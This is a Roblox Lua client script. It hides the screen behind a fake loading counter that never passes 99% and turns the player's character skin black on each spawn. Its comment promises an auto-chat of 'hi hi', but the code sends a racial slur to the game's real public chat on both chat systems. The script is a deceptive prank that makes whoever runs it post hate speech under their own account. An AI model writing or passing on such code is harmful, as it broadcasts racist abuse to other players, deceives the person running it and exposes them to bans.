local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

----------------------------------------------------------------
-- 1. TẠO GIAO DIỆN LOADING BAO PHỦ MÀN HÌNH
----------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CustomLoadingScreen"
screenGui.IgnoreGuiInset = true -- Đảm bảo bao phủ toàn bộ màn hình, kể cả thanh topbar
screenGui.DisplayOrder = 999999 -- Nổi lên trên tất cả các GUI khác
screenGui.Parent = playerGui

-- Màn hình nền trắng
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
background.BorderSizePixel = 0
background.Parent = screenGui

-- Chữ Loading số %
local loadingLabel = Instance.new("TextLabel")
loadingLabel.Size = UDim2.new(0, 400, 0, 100)
loadingLabel.Position = UDim2.new(0.5, -200, 0.5, -50)
loadingLabel.BackgroundTransparency = 1
loadingLabel.TextColor3 = Color3.fromRGB(0, 0, 0) -- Chữ màu đen nổi trên nền trắng
loadingLabel.Font = Enum.Font.GothamBold
loadingLabel.TextSize = 40
loadingLabel.Text = "Loading: 1%"
loadingLabel.Parent = background

----------------------------------------------------------------
-- 2. LOGIC TĂNG % TỪ 1% ĐẾN 99% TRONG 1 PHÚT (60 GIÂY)
----------------------------------------------------------------
task.spawn(function()
	local totalSeconds = 60
	local startPercent = 1
	local endPercent = 99
	local steps = endPercent - startPercent -- 98 bước tăng
	local waitTime = totalSeconds / steps -- Thời gian chờ giữa mỗi % (~0.61 giây)

	for i = startPercent, endPercent do
		loadingLabel.Text = "Loading: " .. tostring(i) .. "%"
		task.wait(waitTime)
	end
	
	-- Giữ nguyên ở 99% mãi mãi
	while true do
		loadingLabel.Text = "Loading: 99%"
		task.wait(1)
	end
end)

----------------------------------------------------------------
-- 3. CHUYỂN MÀU DA NHÂN VẬT SANG MÀU ĐEN
----------------------------------------------------------------
local function turnSkinBlack(character)
	if not character then return end
	-- Chờ nhân vật tải xong các bộ phận
	task.wait(0.5)
	for _, part in pairs(character:GetDescendants()) do
		if part:IsA("BasePart") then
			-- Đổi màu các part cơ thể thành màu đen tuyền
			part.Color = Color3.fromRGB(0, 0, 0)
		elseif part:IsA("BodyColors") then
			-- Nếu có object BodyColors (quy định màu da gốc), đổi toàn bộ thuộc tính của nó
			part.HeadColor3 = Color3.fromRGB(0, 0, 0)
			part.LeftArmColor3 = Color3.fromRGB(0, 0, 0)
			part.LeftLegColor3 = Color3.fromRGB(0, 0, 0)
			part.RightArmColor3 = Color3.fromRGB(0, 0, 0)
			part.RightLegColor3 = Color3.fromRGB(0, 0, 0)
			part.TorsoColor3 = Color3.fromRGB(0, 0, 0)
		end
	end
end

-- Kích hoạt đổi màu da khi chạy script và khi hồi sinh (Spawn)
if localPlayer.Character then
	turnSkinBlack(localPlayer.Character)
end
localPlayer.CharacterAdded:Connect(turnSkinBlack)

----------------------------------------------------------------
-- 4. TỰ ĐỘNG CHAT "hi hi" LÊN HỆ THỐNG REAL CHAT (KHÔNG PHẢI FAKE)
----------------------------------------------------------------
task.spawn(function()
	task.wait(2) -- Chờ một chút sau khi vào màn hình loading để gửi tin nhắn
	
	-- Kiểm tra hệ thống TextChatService mới (Mặc định của Roblox hiện tại)
	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		local generalChannel = TextChatService:FindFirstChild("RBXGeneral", true)
		if generalChannel and generalChannel:IsA("TextChannel") then
			generalChannel:SendAsync("fuck nigger")
		end
	else
		-- Nếu game vẫn dùng hệ thống LegacyChatService cũ
		local replicatedStorage = game:GetService("ReplicatedStorage")
		local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
		if defaultChatSystemChatEvents then
			local sayMessageRequest = defaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
			if sayMessageRequest and sayMessageRequest:IsA("RemoteEvent") then
				sayMessageRequest:FireServer("fuck nigger", "All")
			end
		end
	end
end)
